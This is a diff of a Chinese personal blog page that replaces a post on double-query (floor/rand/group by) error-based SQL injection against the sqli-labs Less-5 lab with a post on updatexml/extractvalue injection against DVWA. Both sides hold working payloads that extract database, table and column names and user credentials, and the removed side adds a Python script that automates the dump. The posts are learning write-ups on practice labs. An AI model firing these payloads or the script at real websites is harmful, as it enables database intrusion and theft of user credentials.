@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">暑假练习第六周(二)sql注入-双查询注入 | 奇点的小屋！</title>
+  <title itemprop="name">SQL注入-报错注入 | 奇点的小屋！</title>
   
     <link rel="shortcut icon" href="/images/favicon.png">
   
@@ -298,11 +298,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alzJrq.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzJrq.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alzaIU.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzaIU.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      暑假练习第六周(二)sql注入-双查询注入</h1>
+      SQL注入-报错注入</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -314,7 +314,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-8-15<span class="bull">
+        2019-12-14<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -328,63 +328,29 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>学习了新内容。</p>
-<p>以sql-libs/Less-5为示例。</p>
-<p><strong>什么是双查询注入呢？</strong></p>
-<p>看大佬的解释太深奥，粗俗的理解就是一个select语句里再嵌套一个select语句，将有用的信息显示在SQL的报错信息。</p>
-<p>首先,理解四个函数/语句：<code>Concat(),Rand(), Floor(), Count(),Group by clause</code></p>
-<p>①concat（）函数</p>
-<p>我理解为组合，汇合函数将括号里的符号连接在一起。</p>
-<p><img src="https://img-blog.csdnimg.cn/20200813110603167.png#pic_center" alt="在这里插入图片描述"><br>将结果连在了一起。<br><img src="https://img-blog.csdnimg.cn/20200813110737267.png#pic_center" alt="在这里插入图片描述"><br>②Rand函数</p>
-<p>用来返回一个01之间的随机数，区间表示就是【0,1）。<br><img src="https://img-blog.csdnimg.cn/20200813111137672.png#pic_center" alt="在这里插入图片描述"><br>括号里为空时，随机产生数。</p>
-<p>当括号里的参数固定时，随机数(随机数列)也是固定的。<br><img src="https://img-blog.csdnimg.cn/2020081311132621.png#pic_center" alt="在这里插入图片描述"></p>
-<p>让我们看一下随机数列</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand(3) from information_schema.columns limit 3;</span><br></pre></td></tr></table></figure>
-<p>产生三列随机数。<br><img src="https://img-blog.csdnimg.cn/20200813111701419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>对比一下还是不变。</p>
-<p>③Floor()函数</p>
-<p>Floor()函数时取整函数，当输入一个非整数，返回小于等于输入参数的最大整数。</p>
-<p><img src="https://img-blog.csdnimg.cn/20200813112714353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>④count()函数</p>
-<p>用于统计行数。</p>
-<p><img src="https://img-blog.csdnimg.cn/20200813113117949.png#pic_center" alt="在这里插入图片描述"><br>⑤group by 语句</p>
-<p>先看这句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema, table_name from information_schema.tables；</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200814204357300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>加上group by语句后：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema, table_name from information_schema.tables by table_schema；</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200814204724226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>加上之后，数据明显少了很多的重复的。重复的数据库只显示一个，并且只显示数据库里的第一张表。</p>
-<p>几个函数灵活运用，会有什么不异想不到的结果呢？</p>
-<p>我们实践一下</p>
-<p>①rand()函数和floor()函数结合使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(5)*12) from information_schema.columns limit 5;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200814205459526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>由内到外逐个分析，rand(5)会随机产生5个不同的值，但是*12，就是将【0，1）扩大到【0，12），floor函数就是取整了。</p>
-<p>②count()函数和group by语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema, count(*) from information_schema.tables group by table_schema;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2020081421022843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>他们的组合就是统计了每个数据库里有多少张表。</p>
-<p>其原理就是：<em>Mysql会建立一张临时表，有group_key和tally两个字段，其中group_key设置了UNIQUE约束，即不能有两行的group_key列的值相同。使用group by语句和count()函数的时候，mysql数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加1。</em></p>
-<p>③双查询的核心语句(几个函数综合使用)</p>
-<p>先看payload：<code>select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20200815120317415.png#pic_center" alt="在这里插入图片描述"><br>报错了，那为什么会报错？<br>分析一下：<br>SQL语句中用列c分组，而列c是floor(rand(14)<em>2)的别名。<br>floor(rand(14)</em>2)产生的随机数列，前四位是：1，0，1，0。</p>
-<p>我们查询的时候，mysql数据库会先建立一个临时表，设置了UNIQUE约束的group_key和tally两个字段。当查询到新的”group_key键”不在临时表中，数据库就会将其插入临时表中，如果数据库中已存在group_key该键，则找到该键对应的”tally计数”字段并加1。</p>
-<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)<em>2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)</em>2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1，临时表变成了：<br><img src="https://img-blog.csdnimg.cn/20200815120517523.png#pic_center" alt="在这里插入图片描述"></p>
-<p>Mysql继续扫描information_schema.columns表，遇到的第二个分组列还是floor(rand(14)<em>2)，计算出其值为1（这个1是随机数列的第三个数），便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)</em>2)，此时又计算了一次，结果为0（这个0是随机数列的第四个数），所以尝试向临时表插入一行数据，group_key为0，tally为1。但实际上临时表中已经有一行的group_key为0，而group_key又设置了不可重复的约束，所以就会出现报错。</p>
-<p>知道了原理，就实战一下。以sql-lib/Less-5为例：</p>
-<p>判断闭合点：<br><img src="https://img-blog.csdnimg.cn/20200815123042896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p> 然后查询数据库：<br> 构建payload:<code>?id=-1&#39; union select 1,count(*),concat( (select database()),floor(rand()*2)) as a from information_schema.tables group by a --+</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20200815123553143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>数据库就在报错的信息里显示出来了。</p>
-<p>但是，因为是随机值，所以只会有50%的概率会报错。<br><img src="https://img-blog.csdnimg.cn/20200815123833129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>相同的payload但显示正常。</p>
-<p>有大佬说，可以通过修改rand()使用的种子来使其百分百报错,如下将rand()改为rand(1)，测试百分之百报错，即payload：<code>?id=-1&#39; union select 1,count(*),concat( (select database()),floor(rand(1)*2)) as a from information_schema.tables group by a --+</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20200815124416644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>但我发现，rand(1)并不会100%报错，反而我是试了几次都没有报错，只有4，11，14，15这几个数会100%报错，我也不知道什么原因，在这里留个悬念，希望大佬能解释一下。</p>
-<p>我们来爆表,前面我们知道了当前数据库的为security，构造payload：<code>?id=-1&#39; union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20200815183114981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>总共四张表，我们在第三张拿到了我们想要的。</p>
-<p>知道了表名，看列值，构造payload：<code>?id=-1&#39; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
-<p>我通过修改limit X,1里X的值，在3，1的时候看到了password字段</p>
-<p><img src="https://img-blog.csdnimg.cn/20200815183928488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在9，1的时候得到了用户名字段<br><img src="https://img-blog.csdnimg.cn/20200815184049881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>开始拿用户名和密码，构造payload：<code>?id=-1&#39; union select 1,count(*),concat( (select username from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20200815184909825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>和<code>?id=-1&#39; union select 1,count(*),concat( (select password from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+</code></p>
-<p><img src="https://img-blog.csdnimg.cn/2020081518495556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里要注意用户名和密码的列数应改相对。</p>
-<p>是不是jio着麻烦，附上Mochaaz大佬的python代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">db_name &#x3D; &#39;&#39;</span><br><span class="line">table_list &#x3D; []</span><br><span class="line">column_list &#x3D; []</span><br><span class="line">url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;192.168.1.158&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">### 获取当前数据库名 ###</span><br><span class="line">print(&#39;当前数据库名:&#39;)</span><br><span class="line">payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39;</span><br><span class="line">r &#x3D; requests.get(url+payload)</span><br><span class="line">db_name &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">print(&#39;[+]&#39; + db_name)</span><br><span class="line">### 获取表名 ###</span><br><span class="line">print(&#39;数据库%s下的表名:&#39; % db_name)</span><br><span class="line">for i in range(50):</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;&#39;%s&#39; limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (db_name,i)</span><br><span class="line">    r &#x3D; requests.get(url+payload)</span><br><span class="line">    if &#39;group_key&#39; not in r.text:</span><br><span class="line">        break</span><br><span class="line">    table_name &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">    table_list.append(table_name)</span><br><span class="line">    print(&#39;[+]&#39; + table_name)</span><br><span class="line">### 获取列名 ###</span><br><span class="line">#### 这里以users表为例 ####</span><br><span class="line">print(&#39;%s表下的列名:&#39; % table_list[-1])</span><br><span class="line">for i in range(50):</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;&#39;%s&#39; limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (table_list[-1],i)</span><br><span class="line">    r &#x3D; requests.get(url + payload)</span><br><span class="line">    if &#39;group_key&#39; not in r.text:</span><br><span class="line">        break</span><br><span class="line">    column_name &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">    column_list.append(column_name)</span><br><span class="line">    print(&#39;[+]&#39; + column_name)</span><br><span class="line">### 获取字段值 ###</span><br><span class="line">#### 这里以username列为例 ####</span><br><span class="line">print(&#39;%s列下的字段值:&#39; % column_list[-2])</span><br><span class="line">for i in range(50):</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (column_list[-2],db_name,table_list[-1],i)</span><br><span class="line">    r &#x3D; requests.get(url + payload)</span><br><span class="line">    if &#39;group_key&#39; not in r.text:</span><br><span class="line">        break</span><br><span class="line">    dump &#x3D; r.text.split(&#39;:&#39;)[-2]</span><br><span class="line">    print(&#39;[+]&#39; + dump)</span><br></pre></td></tr></table></figure>
-<p>花费几小时的注入，代码几秒就出来结果了。<br><img src="https://img-blog.csdnimg.cn/20200815190301388.png#pic_center" alt="在这里插入图片描述"><br>用户名直接出来了，我要好好学python了，啥都不会。</p>
+          <p>本来在BUU上刷题，刷到一个叫<strong>hard SQL</strong>SQL注入题，没思路看到大师傅的wp,是SQL注入里的报错注入，虽说我也接触过报错注入，但是这道题把union过滤了，双查询报错没用了；吓得我赶紧学习了基于 xpath报错注入（extractvalue和updatexml）</p>
+<p><img src="https://img-blog.csdnimg.cn/20200913200343325.jpg#pic_center" alt="在这里插入图片描述"><br>先来解释一下：XPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。</p>
+<p>XPath具体的语法我也就不说了(我不会啊😂)</p>
+<p>报错注入就是我们在查询数据库时，故意巧妙地制造错误的语句，从而使我们想要的结果通过报错返回给我们。</p>
+<p><strong>先说一下updatexml()函数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</span><br><span class="line"></span><br><span class="line">语法： updatexml（XML_document，XPath_string，new_value） xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串</span><br><span class="line"></span><br><span class="line">updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</span><br></pre></td></tr></table></figure>
+<p>例如： select * from test where id = 1 and (updatexml(1,0x7e,3)); 由于0x7e是<del>，不属于xpath语法格式，因此报出xpath语法错误。<br>一般的payload：id=1’and(select updatexml(,concat(‘</del>‘,(select语句())),1))<br>大概理解了，我们就去实践一下</p>
+<p>靶场：<code>DVWA</code>  等级为：low</p>
+<p><img src="https://img-blog.csdnimg.cn/20200913202533313.png#pic_center" alt="在这里插入图片描述"><br>找到闭合点为<code>&#39;</code></p>
+<p>构造payload<code>1&#39; and updatexml(1,concat(0x7e,database()),1)#</code></p>
+<p>数据库的名字已经在报错信息里返回了</p>
+<p><img src="https://img-blog.csdnimg.cn/20200914220620191.png#pic_center" alt="在这里插入图片描述"><br>爆一下数据库表的信息，构造payload：<code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</code><br><img src="https://img-blog.csdnimg.cn/202009142222076.png#pic_center" alt="在这里插入图片描述"><br>统一成功了</p>
+<p>爆一下users字段，构造payload：<code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39;),0x7e),1) #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200914222331678.png#pic_center" alt="在这里插入图片描述"><br>爆值，构造payload：<code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200914222858197.png#pic_center" alt="在这里插入图片描述"><br>这应该时里面的账号和密码了</p>
+<p><strong>再说一下extractvalue()函数</strong></p>
+<p>这个函数的用法和updatexml()应该一样</p>
+<p>我试了一下，都一样</p>
+<p>爆数据库，payload：<code>1&#39; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</code><br><img src="https://img-blog.csdnimg.cn/20200914223617566.png#pic_center" alt="在这里插入图片描述"><br>爆表，payload：<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200914223747191.png#pic_center" alt="在这里插入图片描述"><br>爆值，payload：<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))) #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200914223840182.png#pic_center" alt="在这里插入图片描述"><br>爆值，payload：<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20200914223928676.png#pic_center" alt="在这里插入图片描述"><br>都成功了。</p>
+<p>emmmm,报错注入就先这样吧,BUU的题还没做完🤣🤣🤣</p>
 
         </div>
         <!-- .entry-content -->
@@ -414,39 +380,22 @@
       <section class="post-squares nextprev">
         
           
-            <div class="post-nepre half previous">
+            <div class="post-nepre full previous">
           
-            <a href="/2020/09/03/html+css+php+mysql%20%E7%AE%80%E5%8D%95%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%99%BB%E5%BD%95%E4%B8%8E%E6%B3%A8%E5%86%8C(%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BA%A4%E4%BA%92)/" rel="prev">
+            <a href="/2020/02/11/%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%BF%87%E7%A8%8B%E5%8F%8A%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%EF%BC%81%EF%BC%81%EF%BC%81/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzNZV.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                html+css+php+mysql简单的页面登陆与注册(数据库的交互)</h3>
+                搭建GitHub博客的过程及一些问题！！！</h3>
                 <hr>
               </div>
             </a>
           </div>
         
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2020/08/13/%E6%9A%91%E5%81%87%E7%AC%AC%E5%85%AD%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)sqllibs%E9%9D%B6%E5%9C%BA%E6%B8%A9%E4%B9%A0(1-6)/" rel="next">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg">
-              </div>
-              <span class="label">
-              Next Post</span>
-              <div class="info">
-                <h3>
-                sqllibs靶场温习(1-6)</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
         
       </section>
       
